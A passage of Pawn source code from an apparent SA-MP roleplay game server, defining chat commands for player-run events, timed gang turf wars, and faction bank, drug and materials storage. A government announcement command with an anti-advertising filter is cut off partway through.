   		if(eventorganizer[i] == 1)
    	{
    		GetPlayerName(i, name, sizeof(name));
    	}
   	}
   	format(string, sizeof(string), "{FFFF00}Event: Title: %s Prize: $%s Location: %s Time: %s",eventtitle,FormatNumber(eventprize), eventlocation, eventtime);
   	SendClientMessage(playerid, 0xFFFFFFFF, string);
   	format(string, sizeof(string), "{FFFF00}Event: Organizer: %s Description: %s",name,eventdescription);
   	SendClientMessage(playerid, 0xFFFFFFFF, string);
   	return 1;
}
CMD:e(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(eventorganizer[playerid] == 1 || PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 3)
	{
		new string[300],text[250];
		if(sscanf(params, "s[250]", text)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/e <Message>");
		new name[MAX_PLAYER_NAME];
		GetPlayerName(playerid, name, sizeof(name));
		if(eventorganizer[playerid] == 1)
		{
			format(string, sizeof(string), "{7094DB}Event Organizer %s: %s", name, text);
			SendClientMessageToAll(0xFFFFFFFF, string);
		}
		if(PlayerInfo[playerid][pHelper] >= 3)
		{
		    format(string, sizeof(string), "{7094DB}Helper Organizer %s: %s", name, text);
			SendClientMessageToAll(0xFFFFFFFF, string);
		}
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
		    format(string, sizeof(string), "{7094DB}Admin Organizer %s: %s", name, text);
			SendClientMessageToAll(0xFFFFFFFF, string);
		}
	}
	else
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FFFF00}You're not the organizer of the event.");
	}
	return 1;
}
CMD:stopevent(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(activeevent == 0 && PlayerInfo[playerid][pAdmin] >= 1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}There isn't any events to stop.");
	if(eventorganizer[playerid] == 0 && PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}You're not the organizer of the event.");
	foreach(Player, i)
	{
		eventorganizer[i] = 0;
	}
	SendClientMessageToAll(0xFFFFFFFF, "{FFFF00}Event over.");
	activeevent = 0;
	return 1;
}
CMD:acceptevent(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	if(activeevent == 1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}There's already an active event.");
	new eventid;
	if(sscanf(params, "d", eventid)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/acceptevent <eventid>");
	if(requestingevent[eventid] == 0) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid event ID.");
	strmid(eventtitle, requestingtitle[eventid], 0, strlen(requestingtitle[eventid]));
	strmid(eventlocation, requestinglocation[eventid], 0, strlen(requestinglocation[eventid]));
	strmid(eventdescription, requestingdescription[eventid], 0, strlen(requestingdescription[eventid]));
	eventprize = requestingprize[eventid];
	strmid(eventtime, requestingtime[eventid], 0, strlen(requestingtime[eventid]));
	new string[300],name[MAX_PLAYER_NAME];
	GetPlayerName(eventid, name, sizeof(name));
 	format(string, sizeof(string), "{FFFF00}Event: Title: %s Prize: $%s Location: %s Time: %s",eventtitle,FormatNumber(eventprize), eventlocation, eventtime);
   	SendClientMessageToAll(0xFFFFFFFF, string);
   	format(string, sizeof(string), "{FFFF00}Event: Organizer: %s Description: %s",name,eventdescription);
	SendClientMessageToAll(0xFFFFFFFF, string);
	eventorganizer[eventid] = 1;
	requestingevent[eventid] = 0;
	activeevent = 1;
	new sendername[25];
	GetPlayerName(playerid,sendername,sizeof(sendername));
	format(string, sizeof(string), "Admin %s accepted %s event request.",sendername,name);
	ABroadCast(COLOR_YELLOW,string,1);
	return 1;
}
CMD:requestevent(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pWantedLevel] > 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You`re being chased by police, you can`t make an event.");
	if(activeevent == 1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}There's already an active event.");
	if(requestingevent[playerid] == 1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}You're already requesting an event, cancel it first.");
	new title[50], location[50], description[100], prize, time[50];
	if(sscanf(params, "p<|>s[50]s[50]s[50]s[100]d", title, location, time, description, prize)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/requestevent <Title|Location|Time|Description|Prize>");
	if(strlen(title) < 1 || strlen(title) > 50) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid amount of characters in title.");
	if(strlen(location) < 1 || strlen(location) > 50) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid amount of characters in location.");
	if(strlen(time) < 1 || strlen(time) > 50) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid amount of characters in time.");
	if(strlen(description) < 1 || strlen(description) > 100) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid amount of characters in description.");
	if(prize < 1 || prize > 5000000) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid prize amount.");
	new string[1000],name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	requestingevent[playerid] = 1;
	strmid(requestingtitle[playerid], title, 0, strlen(title));
	strmid(requestinglocation[playerid], location, 0, strlen(location));
	strmid(requestingdescription[playerid], description, 0, strlen(description));
	requestingprize[playerid] = prize;
	strmid(requestingtime[playerid], time, 0, strlen(time));
	format(string, sizeof(string), "{FFFF00}Event %d has been requested, details are below.", playerid);
	SendClientMessage(playerid, 0xFFFFFFFF, string);
	format(string, sizeof(string), "{FFFF00}Event: Title: %s Prize: $%s Location: %s Time: %s",title,FormatNumber(prize), location, time);
   	SendClientMessage(playerid, 0xFFFFFFFF, string);
   	format(string, sizeof(string), "{FFFF00}Event: Organizer: %s Description: %s",name,description);
   	SendClientMessage(playerid, 0xFFFFFFFF, string);
	SendClientMessage(playerid, 0xFFFFFFFF, "{FFFF00}Your event is pending approval from an admin, please wait.");
	format(string, sizeof(string), "{FFFF00}Event %d has been requested, details are below.", playerid);
	ABroadCast(0xFFFFFFFF,string,1);
	format(string, sizeof(string), "{FFFF00}Event %d: Title: %s Prize: $%s Location: %s Time: %s",playerid,title,FormatNumber(prize), location, time);
   	ABroadCast(0xFFFFFFFF,string,1);
	format(string, sizeof(string), "{FFFF00}Event %d: Organizer: %s Description: %s",playerid,name,description);
	ABroadCast(0xFFFFFFFF,string,1);
	format(string, sizeof(string), "{FFFF00}Use [/acceptevent %d] to accept this event.", playerid);
	ABroadCast(0xFFFFFFFF,string,1);
	return 1;
}
CMD:rejectevent(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	new id, reason[100],string[300];
	if(sscanf(params, "us[100]", id, reason)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/rejectevent <eventid> <reason>");
	if(requestingevent[id] == 0) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid event ID.");
	new receivername[MAX_PLAYER_NAME],sendername[MAX_PLAYER_NAME];
	requestingevent[id] = 0;
	GetPlayerName(playerid, sendername, sizeof(sendername));
	GetPlayerName(id, receivername, sizeof(receivername));
	format(string, sizeof(string), "{FFFF00}Admin %s has rejected your event, reason: %s", sendername, reason);
	SendClientMessage(id, 0xFFFFFFFF, string);
	format(string, sizeof(string), "{FFFF00}You rejected %s's event, reason: %s", receivername, reason);
	SendClientMessage(playerid, 0xFFFFFFFF, string);
	return 1;
}
CMD:events(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
    new string[300],tmpstring[100], titlestring[100], count = 0, name[MAX_PLAYER_NAME];
	foreach(Player, i)
	{
		if(requestingevent[i] == 1)
 		{
  			GetPlayerName(i, name, sizeof(name));
    		format(tmpstring, sizeof(tmpstring), "Name: %s | ID: %d | Title: %s", name, i, requestingtitle[i]);
     		strcat(string, tmpstring);
      		count ++;
       	}
   	}
   	if(count == 0) return ShowPlayerDialog(playerid, DIALOG_PENDEVENT, DIALOG_STYLE_MSGBOX, "Pending Requests: 0", "There are no pending requests.", "Done", "");
   	format(titlestring, sizeof(titlestring), "Pending Requests: %d", count);
   	ShowPlayerDialog(playerid, 5345, DIALOG_STYLE_LIST, titlestring, string, "Close", "");
   	SendClientMessage(playerid, 0xFFFFFFFF, "{FFFF00}Use the command /cevent to check the pending event information.");
   	return 1;
}
CMD:cevent(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	new eventid,string[300];
	if(sscanf(params, "u", eventid)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/checkevent <eventid>");
	if(requestingevent[eventid] == 0) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid event ID.");
	new name[MAX_PLAYER_NAME];
	GetPlayerName(eventid, name, sizeof(name));
	format(string, sizeof(string), "{FFFF00}Event %d: Title: %s Prize: $%s Location: %s Time: %s",eventid,requestingtitle[eventid],FormatNumber(requestingprize[eventid]), requestinglocation[eventid], requestingtime[eventid]);
   	SendClientMessage(playerid, 0xFFFFFFFF, string);
	format(string, sizeof(string), "{FFFF00}Event %d: Organizer: %s Description: %s",eventid,name,requestingdescription[eventid]);
	SendClientMessage(playerid, 0xFFFFFFFF, string);
	format(string, sizeof(string), "{FFFF00}Use [/acceptevent %d] to accept this event.", eventid);
    SendClientMessage(playerid, 0xFFFFFFFF, string);
   	return 1;
}
CMD:attack(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new hour,minn,sec;
	gettime(hour,minn,sec);
	if(IsPlayerConnected(playerid))
	{
		if(!IsAMember(playerid)) return SCM(playerid,COLOR_SERVER,"You are not a member of a mafia.");
		if(PlayerInfo[playerid][pRank] < 4) return SCM(playerid,COLOR_SERVER,"You don't have rank 4.");
		//if(GetWeekDay() == 1 || GetWeekDay() == 4 || GetWeekDay() == 6) return SendClientMessage(playerid, COLOR_SERVER, "War-ul este permis doar Luni, Miercuri, Vineri si Duminica.");
		if(hour == 20)
		{
			new turf,faction,string[128],sendername[MAX_PLAYER_NAME];
			for(new i = 1; i <= sizeof(TurfInfo); i++)
			{
				if(IsPlayerInTurf(playerid, i) == 1)
				{
					turf = i;
					break;
				}
    		}
    		GetPlayerName(playerid, sendername, sizeof(sendername));
    		if(turf == 0) return SCM(playerid, COLOR_SERVER, "You are not on a turf.");
			if(DeelayWar[PlayerInfo[playerid][pMember]] > 0)
			{
				format(string,sizeof(string),"Your mafia can attack another turf in %d seconds.",DeelayWar[PlayerInfo[playerid][pMember]]);
				SendClientMessage(playerid, COLOR_SERVER, string);
				return 1;
			}
    		faction = PlayerInfo[playerid][pMember];
    		if(TurfInfo[turf][zOwned] == faction) return SCM(playerid, COLOR_SERVER, "You can't attack your own turf.");
			if(WarInfo[turf][wAttacker] != 0) return SCM(playerid, COLOR_SERVER, "Turf is already attacked.");
			if(InWar[faction] == 1) return SCM(playerid, COLOR_SERVER, "You have an active war.");
			if(InWar[TurfInfo[turf][zOwned]] == 1) return SCM(playerid, COLOR_SERVER, "This mafia have active war.");
			new memberss;
			foreach(Player, i)
			{
	    		if(IsPlayerConnected(i))
	    		{
	        		if(PlayerInfo[i][pMember] == TurfInfo[turf][zOwned])
					{
			    		memberss ++;
					}
				}
			}
			if(memberss < 1) return SCM(playerid, COLOR_SERVER, "This mafia don't have members online.");
			WarInfo[turf][wTime] = 600;
			WarInfo[turf][wAttacker] = faction;
			WarInfo[turf][wFaction] = TurfInfo[turf][zOwned];
			WarScoreF[faction][turf] += 1;
			format(string,sizeof(string),"[TURF] %s from your group attacked turf %d (owned by %s).",sendername,turf,NumeFactiune(TurfInfo[turf][zOwned]));
			SendFamilyMessage(faction,COLOR_GREEN,string);
			format(string,sizeof(string),"[TURF] %s from %s attacked turf %d owned by you.",sendername,NumeFactiune(WarInfo[turf][wAttacker]),turf);
			SendFamilyMessage(TurfInfo[turf][zOwned],COLOR_GREEN,string);
			mysql_query(SQL, "SELECT * FROM wars");
			mysql_store_result();
			new warid = mysql_num_rows() + 1;
			mysql_free_result();
			format(string, sizeof(string),"[WAR] %s started a war with %s (war id: %d).",NumeFactiune(WarInfo[turf][wAttacker]),NumeFactiune(TurfInfo[turf][zOwned]),warid);
			for(new i; i < MAX_PLAYERS; i++)
			{
				if(PlayerInfo[i][pMember] == TurfInfo[turf][zOwned] || PlayerInfo[i][pMember] == WarInfo[turf][wAttacker])
				{
					SetPlayerVirtualWorld(i, 1024);
					SendClientMessage(i, COLOR_YELLOW, "You were beamed into a virtual world where players are only participating in war.");
				}
			}
			new y,m,d,h,mi,s;
			getdate(y,m,d);
			gettime(h,mi,s);
			worstscoreat[turf] = 0;
			worstmemberat[turf] = 999;
			bestscoreat[turf] = 0;
			bestmemberat[turf] = 999;
			worstscoredf[turf] = 0;
			worstmemberdf[turf] = 999;
			bestscoredf[turf] = 0;
			bestmemberdf[turf] = 999;
			InWar[TurfInfo[turf][zOwned]] = 1;
			InWar[faction] = 1;
			waitwar[faction] = 60;
		}
		else return SCM(playerid,COLOR_SERVER,"War must be between 20:00 and 21:00.");
	}
	return 1;
}
CMD:turfs(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(TurfsDisp[playerid] == 0)
	{
		TurfsDisp[playerid] = 1;
		for(new i = 0; i < sizeof(Turfs); i++)
 		{
			if(TurfInfo[i][zOwned] == 4)
			{
				GangZoneShowForPlayerEx(playerid, Turfs[i], 0x18EBD6C8); //Los Aztecas
			}
			if(TurfInfo[i][zOwned] == 5)
			{
				GangZoneShowForPlayerEx(playerid, Turfs[i], 0x40863CAA); //Grove Street
			}
			if(TurfInfo[i][zOwned] == 6)
			{
				GangZoneShowForPlayerEx(playerid, Turfs[i], 0xFFAE00C8); //Los Vagos
			}
			if(TurfInfo[i][zOwned] == 10)
			{
				GangZoneShowForPlayerEx(playerid, Turfs[i], 0xBD1CDEC8); //Ballas
			}
		}
	}
	else
	{
		TurfsDisp[playerid] = 0;
		for(new i = 0; i < sizeof(Turfs); i++)
		{
			GangZoneHideForPlayerEx(playerid, Turfs[i]);
		}
	}
	return 1;
}
CMD:fdeposit(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    if(DepositMoney(playerid))
	    {
			new x = PlayerInfo[playerid][pMember],string[100],cashdeposit;
			if(sscanf(params, "d", cashdeposit)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/fdeposit <money>");
			if(cashdeposit < 1 || cashdeposit > 30000000) return SCM(playerid,COLOR_SERVER,"{FFB870}Money limit is $1 - $30,000,000.");
			if(IsPlayerInRangeOfPoint(playerid,50.0,DynamicFactions[x][fcX],DynamicFactions[x][fcY],DynamicFactions[x][fcZ]))
			{
				if(GetPlayerCash(playerid) >= cashdeposit)
				{
					new oldbalance = DynamicFactions[x][fBank];
					DynamicFactions[x][fBank] += cashdeposit;
					GivePlayerCash(playerid, -cashdeposit);
					Update(playerid,pCashx);
					new str[184];
					mysql_format(SQL,str,sizeof(str),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],x);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, CRISTIAN, "Safebox:");
					format(string, sizeof(string), " Old Balance: $%s", FormatNumber(oldbalance));
					SendClientMessage(playerid, COLOR_SERVER, string);
					format(string, sizeof(string), " Deposit: +$%s ", FormatNumber(cashdeposit));
					SendClientMessage(playerid, COLOR_SERVER, string);
     				format(string, sizeof(string), " New balance: $%s", FormatNumber(DynamicFactions[x][fBank]));
					SendClientMessage(playerid, COLOR_SERVER, string);
				 	return 1;
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have that amount of money.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in HQ.");
		}
	}
	return 1;
}
CMD:fwithdraw(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
  		if(PlayerInfo[playerid][pLeader] !=0)
    	{
			if(PlayerInfo[playerid][pLeader] >= 1)
			{
				new cashdwithdraw,x = PlayerInfo[playerid][pLeader],string[100];
				if(sscanf(params, "d", cashdwithdraw)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/fwithdraw <money>");
				if(IsPlayerInRangeOfPoint(playerid,50.0,DynamicFactions[x][fcX],DynamicFactions[x][fcY],DynamicFactions[x][fcZ]))
				{
					if(cashdwithdraw <= DynamicFactions[x][fBank])
					{
					    if(cashdwithdraw >= 2000000) return SCM(playerid, -1, "You can not remove more than $2.000.000 the saddlef.");
						new oldbalance1 = DynamicFactions[x][fBank];
						GivePlayerCash(playerid,cashdwithdraw);
						Update(playerid,pCashx);
						DynamicFactions[x][fBank] -= cashdwithdraw;
						new str[184];
						mysql_format(SQL,str,sizeof(str),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],x);
						mysql_tquery(SQL,str,"","");
				    	SCM(playerid, CRISTIAN, "Safebox:");
				    	format(string, sizeof(string), "Old Balance: $%s ", FormatNumber(oldbalance1));
				    	SCM(playerid, COLOR_SERVER, string);
						format(string, sizeof(string), "Withdraw: -$%s ", FormatNumber(cashdwithdraw));
						SCM(playerid, COLOR_SERVER, string);
                        format(string, sizeof(string), "New balance: %s %", FormatNumber(DynamicFactions[x][fBank]));
						SCM(playerid, COLOR_SERVER, string);
						return 1;
					}
					else return SCM(playerid, COLOR_SERVER, "{FFB870}You don't have that amount of money in your faction seif.");
	            }
				else return SCM(playerid,COLOR_SERVER,"{FFB870}You are not in HQ.");
	        }
	    }
    	else return SCM(playerid,COLOR_SERVER, "{5CAD5C}Error: Only leaders can use this command..");
	}
	return 1;
}
CMD:fdrugs(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
  		if(IsAMember(playerid))
   		{
			new x,x_nr[70],drugsam,string[100],sendername[30];
			x = PlayerInfo[playerid][pMember];
  			if(sscanf(params, "s[70]d",x_nr,drugsam))
			{
				if(PlayerToPoint(100.0,playerid,DynamicFactions[x][fcX],DynamicFactions[x][fcY],DynamicFactions[x][fcZ]))
				{
					format(string, sizeof(string), "Faction Drugs: %d", DynamicFactions[x][fDrugs]);
					SendClientMessage(playerid, COLOR_SERVER, string);
				}
				SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/fdrugs <name> <ammount>");
			  	SendClientMessage(playerid, COLOR_SERVER, "Available names: Take, Put.");
				return 1;
			}
			if(drugsam < 1 || drugsam > 100) return SCM(playerid,COLOR_SERVER,"{FFB870}Invalid drugs.");
			if(GetPlayerInterior(playerid) == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not in HQ.");
			GetPlayerName(playerid, sendername, sizeof(sendername));
			if(strcmp(x_nr,"take",true) == 0)
			{
				if(PlayerToPoint(100.0,playerid,DynamicFactions[x][fcX],DynamicFactions[x][fcY],DynamicFactions[x][fcZ]))
				{
					if(drugsam <=DynamicFactions[x][fDrugs])
					{
						if(PlayerInfo[playerid][pLeader] == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not leader.");
						PlayerInfo[playerid][pDrugs] += drugsam;
						DynamicFactions[x][fDrugs]=DynamicFactions[x][fDrugs]-drugsam;
						SendClientMessage(playerid, CRISTIAN, "Faction Drug:");
						format(string, sizeof(string), "You get %d grams of drugs.", drugsam);
						SendClientMessage(playerid, COLOR_SERVER, string);
						format(string, sizeof(string), "Total Drugs: %d grams.", DynamicFactions[x][fDrugs]);
						SendClientMessage(playerid, COLOR_SERVER, string);
						format(string, sizeof(string),  "%s has just taken %d drugs from the HQ.",sendername,drugsam);
						SendFamilyMessage(x, COLOR_LIGHTBLUE, string);
						new str[256];
						mysql_format(SQL,str,sizeof(str),"UPDATE `factions` SET `Drugs`='%d' WHERE `ID`='%d'",DynamicFactions[x][fDrugs],x);
						mysql_tquery(SQL,str,"","");
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Drugs`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pDrugs],PlayerInfo[playerid][pNormalName]);
						mysql_tquery(SQL,str,"","");
						return 1;
					}
			 		else
					{
						SendClientMessage(playerid, COLOR_SERVER, "{FFB870}There isn't that much drugs in storage.");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in HQ.");
					return 1;
				}
			}
    		else if(strcmp(x_nr,"put",true) == 0)
			{
				if(PlayerToPoint(100.0,playerid,DynamicFactions[x][fcX],DynamicFactions[x][fcY],DynamicFactions[x][fcZ]))
				{
					if(drugsam <= PlayerInfo[playerid][pDrugs])
					{
						PlayerInfo[playerid][pDrugs] = PlayerInfo[playerid][pDrugs]-drugsam;
						DynamicFactions[x][fDrugs] += drugsam;
						SendClientMessage(playerid, CRISTIAN, "Faction Drug:");
						format(string, sizeof(string), "Deposit: %d grams of drugs.", drugsam);
						SendClientMessage(playerid, COLOR_SERVER, string);
						format(string, sizeof(string), "Total Drugs: %d grams.", DynamicFactions[x][fDrugs]);
						SendClientMessage(playerid, COLOR_SERVER, string);
						PlayerInfo[playerid][pDDeposit] += drugsam;
						Update(playerid,pDDepositx);
						new str[184];
						mysql_format(SQL,str,sizeof(str),"UPDATE `factions` SET `Drugs`='%d' WHERE `ID`='%d'",DynamicFactions[x][fDrugs],x);
						mysql_tquery(SQL,str,"","");
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Drugs`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pDrugs],PlayerInfo[playerid][pNormalName]);
						mysql_tquery(SQL,str,"","");
						return 1;
					}
			 		else
					{
						SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have that much drugs on you.");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in HQ.");
					return 1;
				}
			}
	    }
	    else
	    {
	        SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a gangster or mafiot.");
	        return 1;
	    }
	}
	return 1;
}
CMD:fmats(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
  		if(IsAMember(playerid))
    	{
	        new x,x_nr[70],matsam,string[100],sendername[30];
			x = PlayerInfo[playerid][pMember];
  			if(sscanf(params, "s[70]d",x_nr,matsam))
			{
				if(PlayerToPoint(100.0,playerid,DynamicFactions[x][fcX],DynamicFactions[x][fcY],DynamicFactions[x][fcZ]))
				{
						format(string, sizeof(string), "Faction Mats: %d.", DynamicFactions[x][fMats]);
						SendClientMessage(playerid, COLOR_SERVER, string);
				}
				SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/fmats <name> <ammount>");
			  	SendClientMessage(playerid, COLOR_SERVER, "Available names: Take, Put.");
				return 1;
			}
			if(matsam < 1 || matsam > 1000000) return SCM(playerid,COLOR_SERVER,"{FFB870}Invalid materials.");
			if(GetPlayerInterior(playerid) == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not in HQ.");
			GetPlayerName(playerid, sendername, sizeof(sendername));
			if(strcmp(x_nr,"take",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be Rank 5.");
				if(PlayerToPoint(100.0,playerid,DynamicFactions[x][fcX],DynamicFactions[x][fcY],DynamicFactions[x][fcZ]))
				{
					if(matsam <=DynamicFactions[x][fMats])
					{
						PlayerInfo[playerid][pMats] += matsam;
						DynamicFactions[x][fMats]=DynamicFactions[x][fMats]-matsam;
						SendClientMessage(playerid, CRISTIAN, "Faction Mats:");
						format(string, sizeof(string), "You get %d mats.", matsam);
						SendClientMessage(playerid, COLOR_SERVER, string);
						format(string, sizeof(string), "Total Mats: %d .", DynamicFactions[x][fMats]);
						SendClientMessage(playerid, COLOR_SERVER, string);
						format(string, sizeof(string),  "%s has just taken %s mats from the HQ.",sendername,FormatNumber(matsam));
						SendFamilyMessage(x, COLOR_LIGHTBLUE, string);
						new str[256];
						mysql_format(SQL,str,sizeof(str),"UPDATE `factions` SET `Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fMats],x);
						mysql_tquery(SQL,str,"","");
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Materials`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pMats],PlayerInfo[playerid][pNormalName]);
						mysql_tquery(SQL,str,"","");
						return 1;
					}
	 				else
					{
						SendClientMessage(playerid, COLOR_SERVER, "{FFB870}There isn't that much mats in storage.");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in HQ.");
					return 1;
				}
			}
			else if(strcmp(x_nr,"put",true) == 0)
			{
				if(PlayerToPoint(100.0,playerid,DynamicFactions[x][fcX],DynamicFactions[x][fcY],DynamicFactions[x][fcZ]))
				{
					if(matsam <= PlayerInfo[playerid][pMats])
					{
						PlayerInfo[playerid][pMats] =PlayerInfo[playerid][pMats]-matsam;
						DynamicFactions[x][fMats] +=matsam;
		                SendClientMessage(playerid, CRISTIAN, "Faction Mats:");
						format(string, sizeof(string), "Deposit: %d mats.", matsam);
						SendClientMessage(playerid, COLOR_SERVER, string);
						format(string, sizeof(string), "Total Mats: %d .", DynamicFactions[x][fMats]);
						SendClientMessage(playerid, COLOR_SERVER, string);
						PlayerInfo[playerid][pMDeposit] += matsam;
						Update(playerid,pMDepositx);
						new str[256];
						mysql_format(SQL,str,sizeof(str),"UPDATE `factions` SET `Mats`='%d' WHERE `ID`='%d'",DynamicFactions[x][fMats],x);
						mysql_tquery(SQL,str,"","");
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Materials`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pMats],PlayerInfo[playerid][pNormalName]);
						mysql_tquery(SQL,str,"","");
						return 1;
					}
			 		else
					{
						SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have that much mats on you!");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in HQ.");
					return 1;
				}
			}
	    }
	    else
	    {
	        SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a gangster or mafiot.");
	        return 1;
	    }
	}
	return 1;
}
CMD:government(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pMember] == 14)
		{
    		if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be Rank 5 to be able to use this.");
			new string[300],textgov[250],sendername[MAX_PLAYER_NAME];
		    GetPlayerName(playerid, sendername, sizeof(sendername));
			if(sscanf(params, "s[250]", textgov)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/gov <Message>");
			if(FindIP(textgov)) /// Anti-Reclama
	        {
		        new advertiser[MAX_PLAYER_NAME];
		        GetPlayerName(playerid, advertiser, sizeof(advertiser));
		        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /gov.", advertiser, playerid, textgov);
				ABroadCast(COLOR_SERVER,string,1);
	        }
	        for(new i; i < sizeof(TLD); i++)
			{
				if(strfind(textgov, TLD[i], true) != -1)
				{
					if(strfind(textgov, "wwww.Magic-Gaming.tk", true) != -1 || strfind(textgov, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(textgov, "Magic-Gaming.tk", true) != -1) break;
					new advertiser[MAX_PLAYER_NAME];
					GetPlayerName(playerid, advertiser, sizeof(advertiser));
					format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /gov.", advertiser, playerid, textgov);
					ABroadCast(COLOR_SERVER,string,1);
				}
			}
		    if(PlayerInfo[playerid][pMember] == 1)
		    {
		        SendClientMessageToAll(COLOR_TEAL, "------ Government Announcement (Los Santos Police Department) ------");
				if(PlayerInfo[playerid][pRank] == 7)
				{
